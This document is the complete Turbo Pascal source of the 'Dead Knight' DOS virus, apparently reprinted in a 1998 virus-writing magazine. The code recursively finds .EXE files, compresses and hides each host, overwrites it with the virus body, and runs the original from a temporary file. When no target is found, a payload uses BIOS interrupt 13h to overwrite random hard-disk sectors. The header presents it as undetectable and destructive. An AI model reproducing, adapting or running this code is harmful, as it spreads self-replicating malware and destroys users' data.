{

       ‹‹                  €
      ﬂﬂﬂ  Virus Magazine  € Box 176, Kiev 210, Ukraine      IV   1998
      ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂﬂ€
       ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € € ﬂﬂ€ €
        € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € € ‹‹€ €
        € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € € €‹‹ €
        ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹‹€
           (C) Copyright, 1994-98, by STEALTH group WorldWide, unLtd.

                        Written by Vecna (c) 1993
                             Dead Knight Virus
                 Replacing Spawning Non-Resident Exe Infector
                               Undetectable
                                Compressed
                              Compresse  Host
                               Smash Sectors
}

{$A+,B-,D-,E-,F-,G+,I-,L-,N-,O-,P-,Q-,R-,S-,T-,V-,X+,Y-}
{$M 2048,0,0}
{$L Implode.Obj}

Program Deadknight;{Undead Series}
Uses Dos;
Const V_Size=8252;
  Max_Size=65535-V_Size;
  Busca='Exe';
  Dictionarysize  :Word= 4096;
  Compressiontype :Word= 0;

Type  Bufftype = Packed Array [1..35256] Of Char;
      Intfunc = Function(Var Buff:Bufftype; Var Bsize:Word): Word;

Var I:Longint;
  Attr:Word;
  Nome,Nome2,Newname:String[80];
  Arquivo:Array[1..5]Of File;
  Buffer:Bufftype;

Function Fileexists(Filename: String): Boolean;
Begin
  Assign(Arquivo[1], Filename);
  Reset(Arquivo[1]);
  Close(Arquivo[1]);
  Fileexists := (Ioresult = 0) And (Filename <> '');
End;

Procedure Damage;
Var R:Registers;
Begin
  R.Es:=Seg(Buffer);
  R.Bx:=Ofs(Buffer);
  R.Ah:=3;
  R.Dl:=128;
  R.Dh:=Random(15);
  R.Ch:=Random(1000);
  R.Cl:=Random(17);
  R.Al:=01;
  Intr($13,R);
End;

Function Implode(Read:Intfunc;Write:Intfunc;Var Buf:Bufftype;
                 Var Ctype:Word;Var Bsize:Word):Integer;Far;External;

Function Explode(Read:Intfunc;Write:Intfunc;Var Buf:Bufftype):
                 Integer;Far;External;

Function Readdata(Var Buffer : Bufftype; Var Buffersize : Word):Word;Far;
Var Bytesread:Word;
Begin
  Blockread(Arquivo[5], Buffer, Buffersize, Bytesread);
  Readdata := Bytesread;
End;

Function Writedata(Var Buffer : Bufftype; Var Bytesread : Word):Word;Far;
  Var Byteswritten:Word;
Begin
  Blockwrite(Arquivo[4], Buffer, Bytesread, Byteswritten);
  Writedata := Byteswritten;
End;

Function Peganome:String;
Var Nov_Cam:String[100];
  Procedure Proc1;
  Var Extensao:String[3];
    Caminho:String[100];
    Filetime:Datetime;
    Search:Searchrec;
  Begin
    Findfirst(Nov_Cam+'*.*',Anyfile,Search);
    While Doserror=0Do Begin
      If(Search.Name<>'.')And(Search.Name<>'..')Then Begin
        Extensao:=Copy(Search.Name,Pos('.',Search.Name)+1,3);
        If(Extensao=Busca)And(Not(Fileexists(Copy(Search.Name,1,
                              Pos('.',Search.Name)-1))))Then Begin
          If(Search.Size>V_Size)And(Search.Size<Max_Size)Then
            Peganome:=Nov_Cam+(Search.Name);
        End;
        If (Search.Attr=16) Then Begin
          Caminho:=Nov_Cam;
          Nov_Cam:=Nov_Cam+Search.Name + '\';
          Proc1;
          Nov_Cam:=Caminho;
        End;
      End;
      Findnext(Search);
    End;
  End;
Begin
  Peganome:='';
  Nov_Cam:='\';
  Proc1;
End;

Begin
  Nome2:=Paramstr(0);
  Nome:=Peganome;
  If Nome<>'' Then Begin
    Assign(Arquivo[1],Nome2);
    Assign(Arquivo[2],Nome);
    Assign(Arquivo[3],Nome);

    Getfattr(Arquivo[2],Attr);
    Setfattr(Arquivo[2],Archive);

    Newname:=Copy(Nome,1,Pos('.',Nome)-1);
    Assign(Arquivo[5],Nome);
    Assign(Arquivo[4],Newname);
    Rewrite(Arquivo[4],1);
    Reset(Arquivo[5],1);
    I:=Filesize(Arquivo[5]);

    Implode(Readdata,Writedata,Buffer,Compressiontype,Dictionarysize);

    Reset(Arquivo[1],1);
    Rewrite(Arquivo[2],1);
    Reset(Arquivo[3],1);
    Blockread(Arquivo[1],Buffer,V_Size);
    Blockwrite(Arquivo[2],Buffer,I);

    Close(Arquivo[1]);
    Close(Arquivo[2]);
    Close(Arquivo[3]);
    Close(Arquivo[4]);

    Setfattr(Arquivo[4],Hidden);
    Setfattr(Arquivo[2],Attr);
  End Else Damage;

  Newname:='';
  For I:=1 To Length(Nome2)-4 Do Newname:=Newname+Nome2[I];
  Nome2:='';
  For I:=1 To Paramcount Do Nome2:=Nome2+Paramstr(I)+' ';

  Assign(Arquivo[5],Newname);
  Assign(Arquivo[4],'~Knight.Exe');
  Reset(Arquivo[5],1);
  Rewrite(Arquivo[4],1);

  Explode(Readdata,Writedata,Buffer);

  Close(Arquivo[1]);
  Close(Arquivo[2]);
  Close(Arquivo[3]);
  Close(Arquivo[4]);

  Exec('~Knight.Exe',Nome2);

  Rewrite(Arquivo[4]);
  Close(Arquivo[4]);
  Erase(Arquivo[4]);
End.